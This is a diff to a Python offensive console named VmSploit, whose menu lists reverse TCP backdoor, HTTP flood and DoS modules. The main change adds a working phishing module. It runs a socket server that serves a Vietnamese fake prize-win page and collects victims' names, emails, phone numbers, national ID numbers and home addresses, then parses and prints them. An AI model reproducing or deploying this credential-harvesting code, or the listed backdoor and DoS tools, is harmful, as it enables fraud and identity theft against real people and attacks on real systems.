@@ -26,8 +26,7 @@ data = 'null'
 
 colorama.init()
 
-print(Fore.BLUE + '[*]' + Style.RESET_ALL + f" Starting VmSploitf")
-time.sleep(5)
+os.system('cls')
 
 main = [
 	f'''{Fore.YELLOW}
@@ -53,6 +52,7 @@ main = [
 	f'''{Fore.GREEN}
         _________      .__         .__  __   
 ___  __/   _____/_____ |  |   ____ |__|/  |_ 
+
 \  \/ /\_____  \\____ \|  |  /  _ \|  \   __\
  \   / /        \  |_> >  |_(  <_> )  ||  |  
   \_/ /_______  /   __/|____/\____/|__||__|  
@@ -112,7 +112,7 @@ while True:
    MODULE                          OPTIONS
 ------------------------------------------------
 reverse_tcp_backdoor       created Backdoor File
-http_server_get            created link phishing cookie
+reverse_phishing_tcp       created link phishing cookie
 http_flood                 HTTP FLood Attack (DoS)
 http_dos_attack            DoS Attack
 http_tcp_dos               DoS Layer4 (TCP)
@@ -302,7 +302,7 @@ connection()
 
 # ==============================================================================================================
 
-		if set_module == 'http_server_get':
+		if set_module == 'reverse_phishing_tcp':
 			
 			print("")
 			print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' set module => {set_module}')
@@ -360,54 +360,118 @@ connection()
 
 				elif module == 'exploit':
 					import socket
-					import sys 
+					import os
+					import urllib.parse
+					import time
 
-					HOST = str(f'{host_ip}')
-					PORT = int(port_ip)
+					os.system('cls' if os.name == 'nt' else 'clear')
 
-					def listening():
-						for i in range(3):
-							s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-							s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 100)
-							s.bind((HOST, PORT))
-							s.listen(100)
+					IP = str(input('HOST NAME : '))
+					PORT = int(input("PORT : "))
 
-							print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' Start Session On http://{HOST}:{PORT}')
-							time.sleep(2)
-							print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' http://{HOST}:{PORT} listening...')
-							
-							conn, addr = s.accept()
+					HOSTING_NAME = f'http://{IP}:{PORT}/'
 
-							code = """
-<html>
-<title>hello</title>
-<h1>
-	hello , how are you ?
-</h1>
-<img src='https://upload.wikimedia.org/wikipedia/commons/thumb/d/db/Falun_Gong_Logo.svg/1200px-Falun_Gong_Logo.svg.png' width="300" height="300">
-"""
+					payload_name = 'reverse/http/phishing'
 
-							response = 'HTTP/1.1 200 OK\r\n\r\n' + code
-							conn.sendall(response.encode())
+					def handler_phishing():
+						for i in range(6):
+							handler_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+							handler_conn.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+							handler_conn.bind((IP, PORT))
+							handler_conn.listen(1)
 
-							print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' 1 {addr} has open the link...')
-							time.sleep(2)
+							print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' Server listening on host {HOSTING_NAME}')
 
-							output_data = conn.recv(1024).decode()
+							handler_connect, handler_address = handler_conn.accept()
 
-							print("")
-							print(Fore.GREEN + '[*]' + Style.RESET_ALL + f' {output_data}')
+							code_html = """
+					<!DOCTYPE html>
+					<html>
+					<head>
+					    <meta charset="utf-8">
+					    <meta name="viewport" content="width=device-width, initial-scale=1">
+					    <title>Đổi Quà, CHúng Thưởng, </title>
+					</head>
 
-							conn.close()
+					<body style="background-image: url('https://www.toyota.com.vn/media/o2vlqlfq/62281c8f4761654980c608f8e78129ad.jpg');">
 
-							session = True
+					    <img src="https://png.pngtree.com/png-vector/20210221/ourlarge/pngtree-wheel-of-luck-casino-jackpot-design-with-golden-glittering-playing-prize-png-image_2928672.png" width="200" height="200">
 
-						print("[+] Session CLosed")
-						print("")
+					    <h1>Bạn Đã Trúng Thưởng</h1>
+					    <h2>Đăng Ký Để Nhận Quà</h2>
+					    <h2>Vui Lòng nhập thông tin để nhận thưởng</h2>
+					    <form action="/doi-qua-trung-thuong">
+					        <label for="lname">Họ : </label>
+					        <input type="text" id="lusr" name="lusr" reaquired><br> 
 
-						data = f'{output_data}'
+					        <label for="fname">Tên : </label>
+					        <input type="text" id="fusr" name="fusr" required><br>
 
-					listening()
+					        <label for="mailer">Email : </label>
+					        <input type="text" id="email" name="email" reaquired><br> 
+
+					        <label for="phone">Số Điện Thoại : </label>
+					        <input type="text" id="num" name="num" required><br>
+
+					        <label for="card">Số CMND/CCCD : </label>
+					        <input type="text" id="cmnd" name="cmnd" reaquired><br> 
+
+					        <label for="address">Nơi ở, địa chỉ cụ thể : </label>
+					        <input type="text" id="addr" name="addr" required><br>
+
+					        <input type="submit" value="Đăng Ký">
+					    </form>
+					</body>
+					</html>"""
+								
+							http_request = "HTTP/1.1 200 OK\r\n\r\n" + code_html
+							handler_connect.send(http_request.encode())
+
+							print(Fore.BLUE + '[*]' + Style.RESET_ALL + f' {handler_address} open link')
+
+							data = handler_connect.recv(1024).decode()
+							if '/doi-qua-trung-thuong' in data:
+								print("")
+								print(Fore.BLUE + '[*]' + Style.RESET_ALL + f" Starting Update Output DATABASE...")
+								date_time = 3
+								time.sleep(date_time)
+								output = data.split("\r\n")
+								for line in output:
+									if "lusr=" in line:
+										lusr = line.split("lusr=")[1].split("&")[0]
+										lusr = urllib.parse.unquote_plus(lusr)
+										print(f"Last Name : {lusr}")
+
+									if "fusr=" in line:
+										fusr = line.split("fusr=")[1].split("&")[0]
+										fusr = urllib.parse.unquote_plus(fusr)
+										print(f"Fist Name : {fusr}")
+
+									if "email=" in line:
+										email = line.split("email=")[1].split("&")[0]
+										email = urllib.parse.unquote_plus(email)
+										print(f"Email : {email}")
+
+									if "num=" in line:
+										num = line.split("num=")[1].split("&")[0]
+										num = urllib.parse.unquote_plus(num)
+										print(f"Phone Num : {num}")
+
+									if "cmnd=" in line:
+										cmnd = line.split("cmnd=")[1].split("&")[0]
+										cmnd = urllib.parse.unquote_plus(cmnd)
+										print(f"Info Peole Card ID : {cmnd}")
+
+									if "addr=" in line:
+										addr = line.split("addr=")[1].split("&")[0]
+										addr = urllib.parse.unquote_plus(addr)
+										print(f"Address : {addr}")
+										print("")
+
+
+							handler_connect.close()
+
+					handler_phishing()
 
 # =========================================================================================
 		
